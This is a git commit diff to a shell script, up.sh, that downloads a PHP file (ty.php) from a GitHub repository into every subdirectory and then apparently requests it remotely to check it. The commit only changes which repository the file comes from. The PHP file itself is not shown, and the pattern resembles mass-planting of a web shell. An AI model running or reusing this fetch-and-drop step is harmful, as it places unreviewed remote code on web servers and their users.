097c5a2ef4da7437b05feed16461d3430db3631e
arrow9hc <mygoodstore2026@proton.me>
2026-06-11 16:19:17 +0000

    Update up.sh

--- up.sh
+++ up.sh
@@ -3,7 +3,7 @@ for dir in */; do
     echo "Checking $dirname..."
     
     # 下载文件到当前目录
-    if wget -q https://github.com/arrowxxc/test2/raw/refs/heads/main/ty.php -O "${dirname}/ty.php"; then
+    if wget -q https://github.com/arrow9hc/test2/raw/refs/heads/main/ty.php -O "${dirname}/ty.php"; then
         echo "  ✓ Downloaded to ${dirname}/ty.php"
         
         # 请求远程 URL 检查内容
